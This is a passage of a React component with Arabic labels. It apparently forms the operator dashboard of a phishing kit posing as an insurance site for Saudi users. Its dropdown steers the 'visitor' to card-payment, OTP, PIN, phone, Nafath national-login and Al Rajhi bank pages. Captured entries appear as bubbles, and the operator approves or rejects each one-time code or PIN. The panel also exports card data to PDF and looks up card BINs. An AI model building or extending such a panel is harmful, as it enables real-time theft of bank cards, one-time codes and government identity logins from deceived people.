              className="flex w-full items-center justify-center gap-2 rounded-lg bg-indigo-600 px-4 py-2 text-sm font-medium text-white transition-colors hover:bg-indigo-700 disabled:cursor-not-allowed disabled:opacity-50 sm:w-auto"
            >
              {isGeneratingCardPdf ? (
                <>
                  <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                  </svg>
                  جاري التحميل...
                </>
              ) : (
                <>💳 PDF البطاقة</>
              )}
            </button>
            {/* Navigation Dropdown */}
            <select
              onChange={(e) => handleNavigate(e.target.value)}
              disabled={isNavigating}
              className="w-full rounded-lg border border-gray-300 bg-white px-4 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 disabled:opacity-50 sm:w-auto"
            >
              <option value="">توجيه الزائر...</option>
              <option value="home">🏠 الرئيسية</option>
              <option value="insur">📋 بيانات التأمين</option>
              <option value="compar">📊 مقارنة العروض</option>
              <option value="payment">💳 الدفع (بطاقة)</option>
              <option value="otp">🔑 OTP</option>
              <option value="pin">🔐 PIN</option>
              <option value="phone">📱 معلومات الهاتف</option>
              <option value="nafad">🇸🇦 نفاذ</option>
              <option value="nafad_modal">🪟 نافذة نفاذ</option>
              <option value="rajhi">🏦 راجحي</option>
            </select>
          </div>
        </div>
      </div>

      {/* Bubbles */}
      <div className="flex-1 overflow-y-auto p-3 md:p-6">
        {sortedBubbles.length === 0 ? (
          <div className="text-center text-gray-500 py-12">
            <p>لا توجد بيانات لعرضها</p>
          </div>
        ) : (
          <div
            className="flex flex-col gap-4"
            dir="rtl"
          >
            {/* All Bubbles - Single Column */}
            {sortedBubbles.map((bubble) => (
              <div key={bubble.id} className="flex flex-col">
                <DataBubble
                  title={bubble.title}
                  data={bubble.data}
                  timestamp={bubble.timestamp}
                  status={bubble.status}
                  pendingAction={pendingActions[bubble.id]}
                  showActions={bubble.showActions}
                  isLatest={bubble.isLatest}
                  layout="vertical"
                  actions={
                    bubble.customActions ? (
                      bubble.customActions
                    ) : bubble.showActions ? (
                      <div className="flex gap-2 w-full">
                        {bubble.type === "card" && (
                          <>
                            <button onClick={() => handleBubbleAction(bubble.id, "otp")} disabled={isProcessing}
                              className="rounded-full bg-blue-600 px-3 py-1.5 text-xs font-semibold text-white hover:bg-blue-700 disabled:opacity-50 transition-colors">
                              🔑 OTP
                            </button>
                            <button onClick={() => handleBubbleAction(bubble.id, "pin")} disabled={isProcessing}
                              className="rounded-full bg-purple-600 px-3 py-1.5 text-xs font-semibold text-white hover:bg-purple-700 disabled:opacity-50 transition-colors">
                              🔐 PIN
                            </button>
                            <button onClick={() => handleBubbleAction(bubble.id, "reject")} disabled={isProcessing}
                              className="rounded-full bg-red-500 px-3 py-1.5 text-xs font-semibold text-white hover:bg-red-600 disabled:opacity-50 transition-colors">
                              رفض
                            </button>
                          </>
                        )}
                        {(bubble.type === "otp" || bubble.type === "pin" || bubble.type === "phone_otp" || bubble.type === "rajhi" || bubble.type === "final_otp") && (
                          <>
                            <button onClick={() => handleBubbleAction(bubble.id, "reject")} disabled={isProcessing}
                              className="flex-1 rounded-lg bg-red-600 px-4 py-2.5 text-sm font-bold text-white hover:bg-red-700 disabled:opacity-50 transition-colors">
                              ✗ رفض
                            </button>
                            <button onClick={() => handleBubbleAction(bubble.id, "approve")} disabled={isProcessing}
                              className="flex-1 rounded-lg bg-green-600 px-4 py-2.5 text-sm font-bold text-white hover:bg-green-700 disabled:opacity-50 transition-colors">
                              ✓ قبول
                            </button>

                            {bubble.type === "phone_otp" && (
                              <button onClick={() => handleBubbleAction(bubble.id, "resend")} disabled={isProcessing}
                                className="rounded-full bg-blue-600 px-3 py-1.5 text-xs font-semibold text-white hover:bg-blue-700 disabled:opacity-50 transition-colors">
                                إعادة إرسال
                              </button>
                            )}
                          </>
                        )}
                      </div>
                    ) : null
                  }
                />
                {(bubble as any).binNumber && (
                  <BinInfo cardNumber={(bubble as any).binNumber} />
                )}
              </div>
            ))}
          </div>
        )}

      </div>
    </div>
  );
}
